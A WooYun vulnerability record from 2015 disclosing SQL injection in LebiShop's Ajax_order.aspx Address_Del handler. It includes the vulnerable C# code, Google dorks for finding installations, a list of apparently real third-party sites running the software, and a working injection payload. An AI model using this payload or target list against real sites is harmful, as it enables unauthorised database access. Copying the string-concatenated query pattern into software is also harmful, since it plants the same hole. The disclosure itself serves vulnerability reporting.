{"id": 40963, "wybug_id": "wooyun-2015-090352", "wybug_title": "LebiShop系统sql注入", "wybug_corp": "LebiShop", "wybug_author": "hello", "wybug_date": "2015-01-09 15:55", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 官网 http://www.lebi.cn/demo站点 http://demo.lebi.cn/用google搜索 关键词 intext:Powered by LebiShop或者google搜索关键词Powered by LebiShop inurl:Category.aspx 详细说明：  下面是一部分案例 安装量是有的\nhttp://168dev.com/lebishop/Category.aspxhttp://oa.psy123.com.cn/AllCategories.aspxhttp://www.huacaiye.com/Category.aspx?tid=1http://daiba.com.cn/Category.aspx?id=9http://hkapp.cn/EN/Category.aspx?id=10http://54mbb.com/EN/NewsDetails.aspx?id=5http://shop.lutoog.com/Brand.aspx?id=189http://queengift.net/EN/Brand.aspx?id=190http://www.snsrn.com/en/http://www.skycastle100.com/Search.aspx?keyword=lianyiquanhttp://71pg.com/Category.aspx?tid=35http://www.rft.net.cn/Search.aspx?keyword=[key]&sort=1&page=2http://lovedou.com/en/http://www.woofoo51.com/EN/Category.aspx?id=111&pid=0&sort=1&tid=0&page=1http://newautoch.com/NewsDetails.aspx?id=5http://memy.cc/http://www.thanks789.com/Brand.aspx?id=191http://m.gzyytz.cn/http://www.thanks789.com/Brand.aspx?id=191\n漏洞地址\nhttp://demo.lebi.cn/ajax/Ajax_order.aspx\n\npublic void Address_Del(){    string str = RequestTool.RequestString(\"id\"); //只是处理了单引号 这里不需要单引号    if (str == \"\")    {        base.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要删除的信息\") + \"\\\"}\");    }    else    {        B_Lebi_User_Address.Delete(string.Concat(new object[] { \"User_id = \", base.CurrentUser.id, \" and id in(\", str, \")\" }));//存在注入        if (B_Lebi_User_Address.GetModel(string.Concat(new object[] { \"User_id = \", base.CurrentUser.id, \" and id = \", base.CurrentUser.User_Address_id })) == null)        {            if (B_Lebi_User_Address.GetModel(\"User_id = \" + base.CurrentUser.id) != null)            {                base.CurrentUser.User_Address_id = B_Lebi_User_Address.GetMaxId(\"User_id=\" + base.CurrentUser.id);            }            B_Lebi_User.Update(base.CurrentUser);        }        base.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");    }}\n漏洞证明访问\nhttp://demo.lebi.cn/ajax/Ajax_order.aspx\npost提交\n__Action=Address_Del&id=-1) and convert(int,@@version)>0--\n\n\n   漏洞证明：  漏洞证明如上   修复方案：  对id进行处理   版权声明：转载请注明来源 hello@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-01-15 17:24 |    \t\thello \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:14        | 小菜一个)\t\t \n  @LebiShop   还有这个    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}